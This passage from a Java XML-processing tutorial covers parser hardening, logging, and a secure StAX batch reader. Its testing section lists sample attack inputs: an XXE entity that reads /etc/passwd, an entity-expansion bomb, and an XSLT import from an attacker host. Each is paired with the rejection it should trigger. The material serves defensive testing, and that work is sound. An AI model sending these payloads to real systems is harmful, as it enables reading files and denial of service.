| Namespace error | elemen tidak sesuai namespace | reject atau route unknown version |
| Schema error | missing required element | contract validation error |
| Semantic error | amount negatif | domain validation error |
| Security error | DOCTYPE ditemukan | reject sebagai policy violation |
| Resource limit error | too deep/too large | reject sebagai limit exceeded |
| Transformation error | XSLT gagal | integration mapping error |

Jangan semua ditangkap sebagai:

```text
500 Internal Server Error
```

Boundary yang baik membedakan:

```text
Bad input from caller/partner -> 4xx / rejected file / validation report
Internal transform/config bug -> 5xx / operational alert
Security policy violation -> security event + reject
```

---

## 14. Observability Untuk XML Processing

Jangan log seluruh XML payload sembarangan. XML sering berisi PII, credentials, signed content, atau dokumen legal.

Log yang berguna:

```text
correlationId
partnerId
messageType
schemaVersion
parserModel=STAX/DOM/SAX
payloadSizeBytes
recordCount
durationMs
validationErrorCount
firstErrorCode
securityPolicyViolation=true/false
```

Untuk file batch:

```text
fileName
fileHash
receivedAt
processedRecords
failedRecords
checkpoint
replayId
```

Untuk transform:

```text
stylesheetVersion
inputContractVersion
outputContractVersion
transformDurationMs
```

### 14.1 Audit Invariant

Jika XML adalah kontrak legal/regulatory:

```text
Raw input should be preserved separately from normalized domain state.
```

Tetapi preservation harus memperhatikan:

- encryption at rest,
- access control,
- retention policy,
- masking/tokenization,
- hash for integrity,
- compression for storage.

---

## 15. Java 8 sampai Java 25 Notes

### 15.1 API Availability

JAXP/DOM/SAX/StAX/XPath/XSLT berada dalam Java SE `java.xml` module pada Java 9+ dan tersedia secara built-in pada Java 8.

Berbeda dengan JAXB/JAX-WS yang dihapus dari JDK sejak Java 11, XML processing core seperti DOM/SAX/StAX tetap menjadi bagian Java SE.

### 15.2 JPMS

Jika menggunakan `module-info.java`:

```java
module com.example.xmlprocessing {
    requires java.xml;
}
```

### 15.3 Dependency Strategy

Untuk core parsing:

- tidak perlu dependency eksternal untuk DOM/SAX/StAX API dasar,
- tetapi implementasi/processor tertentu bisa ditambahkan jika butuh fitur/performa khusus,
- XSLT versi modern seperti XSLT 2.0/3.0 biasanya membutuhkan processor eksternal seperti Saxon, karena default JDK historically fokus pada XSLT 1.0 style capability.

### 15.4 App Server / Container Trap

Di Jakarta EE server, parser implementation bisa dipengaruhi oleh:

- JDK,
- server-provided libraries,
- application dependencies,
- classloader isolation,
- system properties.

Karena itu test XML security/performance harus dilakukan pada runtime target, bukan hanya unit test local.

---

## 16. Complete Example: XML Intake Pipeline Dengan StAX

Use case:

- partner mengirim XML batch order,
- kita perlu proses order satu per satu,
- tidak boleh load seluruh document,
- unknown elements harus diskip,
- limit record harus diberlakukan.

```java
import javax.xml.XMLConstants;
import javax.xml.stream.XMLInputFactory;
import javax.xml.stream.XMLStreamConstants;
import javax.xml.stream.XMLStreamReader;
import java.io.InputStream;
import java.math.BigDecimal;
import java.util.Objects;
import java.util.function.Consumer;

public final class OrderBatchReader {

    private static final int MAX_ORDERS = 100_000;
    private static final int MAX_TEXT_LENGTH = 10_000;

    public void read(InputStream input, Consumer<Order> consumer) throws Exception {
        Objects.requireNonNull(input, "input");
        Objects.requireNonNull(consumer, "consumer");

        XMLInputFactory factory = XMLInputFactory.newFactory();
        factory.setProperty(XMLInputFactory.SUPPORT_DTD, false);
        factory.setProperty("javax.xml.stream.isSupportingExternalEntities", false);
        factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");

        XMLStreamReader reader = factory.createXMLStreamReader(input);
        int count = 0;

        try {
            while (reader.hasNext()) {
                int event = reader.next();

                if (event == XMLStreamConstants.START_ELEMENT
                        && "order".equals(reader.getLocalName())) {

                    if (++count > MAX_ORDERS) {
                        throw new XmlPolicyException("Too many order records");
                    }

                    Order order = readOrder(reader);
                    consumer.accept(order);
                }
            }
        } finally {
            reader.close();
        }
    }

    private Order readOrder(XMLStreamReader reader) throws Exception {
        String id = reader.getAttributeValue(null, "id");
        String customerId = null;
        BigDecimal amount = null;

        while (reader.hasNext()) {
            int event = reader.next();

            if (event == XMLStreamConstants.START_ELEMENT) {
                switch (reader.getLocalName()) {
                    case "customerId" -> customerId = readText(reader, "customerId");
                    case "amount" -> amount = new BigDecimal(readText(reader, "amount"));
                    default -> skipElement(reader);
                }
            }

            if (event == XMLStreamConstants.END_ELEMENT
                    && "order".equals(reader.getLocalName())) {
                return new Order(require(id, "id"), require(customerId, "customerId"), require(amount, "amount"));
            }
        }

        throw new XmlPolicyException("Unexpected end of XML inside order");
    }

    private String readText(XMLStreamReader reader, String elementName) throws Exception {
        String text = reader.getElementText();
        if (text.length() > MAX_TEXT_LENGTH) {
            throw new XmlPolicyException("Text too long for element: " + elementName);
        }
        return text.trim();
    }

    private void skipElement(XMLStreamReader reader) throws Exception {
        int depth = 1;
        while (reader.hasNext() && depth > 0) {
            int event = reader.next();
            if (event == XMLStreamConstants.START_ELEMENT) depth++;
            if (event == XMLStreamConstants.END_ELEMENT) depth--;
        }
    }

    private static <T> T require(T value, String field) {
        if (value == null) {
            throw new XmlPolicyException("Missing required field: " + field);
        }
        return value;
    }

    public record Order(String id, String customerId, BigDecimal amount) {}

    public static final class XmlPolicyException extends RuntimeException {
        public XmlPolicyException(String message) {
            super(message);
        }
    }
}
```

Mental model dari contoh ini:

```text
Parser policy first
    -> streaming extraction
    -> explicit limits
    -> unknown element strategy
    -> required field validation
    -> domain-neutral record
```

Ini jauh lebih production-ready daripada:

```java
Document doc = builder.parse(input);
```

untuk semua kasus.

---

## 17. Testing Strategy

### 17.1 Test Well-Formed XML

```xml
<orders><order id="O-1"><amount>10.00</amount></order></orders>
```

Expected:

```text
parsed successfully
```

### 17.2 Test Malformed XML

```xml
<orders><order></orders>
```

Expected:

```text
rejected as malformed XML
```

### 17.3 Test Namespace Variation

```xml
<a:order xmlns:a="urn:example:order">...</a:order>
<b:order xmlns:b="urn:example:order">...</b:order>
```

Expected:

```text
both accepted if namespace URI and local name match
```

### 17.4 Test XXE Attempt

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```

Expected:

```text
rejected; no file read; security event emitted
```

### 17.5 Test Entity Expansion

```xml
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
]>
<lolz>&lol1;</lolz>
```

Expected:

```text
rejected by DTD disabled / entity expansion protection
```

### 17.6 Test Huge Text

```xml
<name>...10MB text...</name>
```

Expected:

```text
rejected by field length limit
```

### 17.7 Test Deep Nesting

```xml
<a><a><a>...many levels...</a></a></a>
```

Expected:

```text
rejected by parser/security limits or custom depth guard
```

### 17.8 Test XPath Injection

If XPath expression uses user input, test payloads that alter expression semantics.

Expected:

```text
input rejected or treated as literal variable, not expression code
```

### 17.9 Test XSLT External Access

Stylesheet attempting:

```xml
<xsl:import href="http://attacker.example/x.xsl"/>
```

Expected:

```text
blocked by ACCESS_EXTERNAL_STYLESHEET policy
```

---

## 18. Common Anti-Patterns

### 18.1 “Use DOM For Everything”

DOM is easy until input grows.

Better:

```text
Small bounded XML -> DOM acceptable
Large/unbounded XML -> SAX/StAX
```

### 18.2 “Disable XXE Only In One Parser”

A system may parse XML in multiple places:

- request filter,
- SOAP stack,
- JAXB unmarshaller,
- DOM parser,
- XSLT transformer,
- schema validator.

Policy must cover all entry points.

### 18.3 “Namespace Unaware Parsing”

Turning off namespace awareness may make simple tests pass but break real contract semantics.

### 18.4 “XPath Without NamespaceContext”

XPath query silently returns nothing for default namespace XML.

### 18.5 “XSLT As Business Logic Dumping Ground”

XSLT is good for document transformation, not for hidden business rules that need observability, authorization, or domain validation.

### 18.6 “Logging Raw XML Payload”

Raw XML may contain:

- PII,
- credentials,
- signed documents,
- tokens,
- confidential remarks,
- regulatory evidence.

Log metadata and hash, not full payload by default.

### 18.7 “Trust Local Files Forever”

A file that is local today can become partner-provided tomorrow. Keep parser hardening consistent.

---

## 19. Top 1% Engineer Perspective

A top-tier engineer does not ask only:

> “How do I parse XML in Java?”

They ask:

1. What is the **trust boundary** of this XML?
2. Is the input size **bounded**?
3. Is the XML a **legal/audit contract**?
4. Do we need **full tree**, or only selected fields?
5. Can parser defaults trigger **network/file access**?
6. How do we handle **namespace versioning**?
7. Can we reject bad input **early**?
8. Is validation structural, semantic, or both?
9. Can this parser path survive **Java 8 to 25 migration**?
10. How do we observe parse failures without leaking payload?
11. What is the replay/idempotency behavior for batch files?
12. How do we test malicious XML fixtures in CI?

The skill is not memorizing DOM/SAX/StAX APIs. The skill is choosing the smallest processing model that satisfies the contract while minimizing memory, attack surface, and operational ambiguity.

---

## 20. Summary

DOM, SAX, StAX, XPath, and XSLT solve different XML processing problems.

Key takeaways:

1. **DOM** gives a full tree and random access but costs memory.
2. **SAX** is push-based streaming and memory efficient but state management can become complex.
3. **StAX** is pull-based streaming and often the best fit for large enterprise XML payloads.
4. **XPath** is expressive for querying XML trees but requires namespace discipline and injection awareness.
5. **XSLT** is powerful for declarative document transformation but must be secured and governed.
6. XML parser defaults are not a production security policy.
7. Secure processing, external access restrictions, DTD/entity controls, size limits, and observability are mandatory for untrusted XML.
8. Java 8–25 still includes core XML processing APIs, but runtime/container behavior must be tested.
9. XML integration should be designed as a boundary pipeline, not just a parsing utility.

---

## 21. References

- Oracle Java API for XML Processing Security Guide: secure processing features and JAXP security properties.
- Oracle JAXP Tutorial: DOM, SAX, StAX, XPath, XSLT concepts and usage.
- Oracle StAX Tutorial: cursor API vs iterator API and StAX use cases.
- OWASP XML External Entity Prevention Cheat Sheet: Java parser hardening guidance.
- Java SE `java.xml` module documentation: JAXP, StAX, SAX, and DOM API availability in Java module system.
- W3C XML, DOM, XPath, and XSLT specifications for conceptual model and transformation/query semantics.

---

## 22. Status Seri

Part ini adalah **Part 13 dari 34**.

Seri **belum selesai**.

Part berikutnya:

> **Part 14 — XML Schema / XSD Deep Dive: simple/complex types, sequence/choice/all, namespace qualification, substitution groups, extension/restriction, schema evolution.**
